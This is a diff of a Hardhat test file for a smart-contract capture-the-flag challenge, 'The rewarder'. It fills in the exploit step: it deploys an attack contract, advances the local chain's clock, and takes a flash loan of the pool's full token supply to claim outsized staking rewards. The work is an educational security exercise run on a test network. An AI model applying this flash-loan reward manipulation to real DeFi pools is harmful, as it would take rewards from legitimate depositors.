@@ -66,6 +66,24 @@ describe('[Challenge] The rewarder', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const RewardAttackFactory = await ethers.getContractFactory('RewardAttack', attacker);
+
+        const rewardAttack = await RewardAttackFactory.deploy(this.liquidityToken.address);
+
+
+        // Advance time 5 days so that depositors can get rewards
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+
+        await rewardAttack.connect(attacker).attack(
+            this.rewarderPool.address,
+            this.flashLoanPool.address,
+            TOKENS_IN_LENDER_POOL,
+            this.rewardToken.address,
+            this.accountingToken.address
+        );
+
+        // await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+        await this.rewarderPool.connect(attacker).distributeRewards();
     });
 
     after(async function () {
@@ -81,6 +99,7 @@ describe('[Challenge] The rewarder', function () {
             await this.rewarderPool.connect(users[i]).distributeRewards();
             let rewards = await this.rewardToken.balanceOf(users[i].address);
             
+            console.log("User rewards are ", ethers.utils.formatUnits(rewards , 'ether') )
             // The difference between current and previous rewards balance should be lower than 0.01 tokens
             let delta = rewards.sub(ethers.utils.parseEther('25'));
             expect(delta).to.be.lt(ethers.utils.parseUnits('1', 16))
